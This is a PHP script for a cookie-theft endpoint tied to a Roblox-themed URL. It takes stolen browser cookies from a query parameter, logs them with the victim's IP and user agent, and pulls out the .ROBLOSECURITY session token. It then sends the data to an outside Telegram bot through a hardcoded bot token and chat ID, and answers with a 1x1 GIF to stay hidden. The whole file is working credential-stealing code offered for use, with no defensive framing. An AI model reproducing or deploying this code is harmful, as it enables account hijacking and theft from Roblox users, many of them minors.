<?php
// api.php — Cookie capture endpoint
// Location: https://cosmo.baby/assets/RobloxSafari/api.php

$TG_TOKEN = '8860989517:AAF5xMj-l6s_YY2FGYTH06RJ_3CIIGIg4';
$TG_CHAT = '5310886054';
$LOG_FILE = __DIR__ . '/captures.log';

$cookie = $_GET['c'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

if (strlen($cookie) > 3) {
    
    $has_roblox = (strpos($cookie, '.ROBLOSECURITY') !== false || 
                   strpos($cookie, 'WARNING:-DO-NOT-SHARE') !== false);
    
    // Log to file
    $flags = $has_roblox ? ' [HAS_ROBLOX]' : '';
    $log_line = "[$time] IP: $ip$flags | Cookies: $cookie\n";
    file_put_contents($LOG_FILE, $log_line, FILE_APPEND);
    
    // Build Telegram message
    $msg = "<b>" . ($has_roblox ? "🔥 ROBLOX COOKIE CAPTURED" : "📦 COOKIES CAPTURED") . "</b>\n";
    $msg .= "<b>Time:</b> $time\n";
    $msg .= "<b>IP:</b> $ip\n";
    $msg .= "<b>User-Agent:</b> " . substr($ua, 0, 150) . "\n\n";
    
    if ($has_roblox) {
        preg_match('/\.ROBLOSECURITY=([^;]+)/', $cookie, $matches);
        $roblox_value = $matches[1] ?? 'could not extract';
        $msg .= "<b>🎯 .ROBLOSECURITY Token:</b>\n<code>" . substr($roblox_value, 0, 300) . "</code>\n\n";
    }
    
    $msg .= "<b>All Cookies:</b>\n<code>" . substr($cookie, 0, 400) . "</code>";
    
    $telegram_url = "https://api.telegram.org/bot$TG_TOKEN/sendMessage?" . 
                    "chat_id=$TG_CHAT&text=" . urlencode($msg) . "&parse_mode=HTML";
    @file_get_contents($telegram_url);
}

header('Content-Type: image/gif');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Access-Control-Allow-Origin: *');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
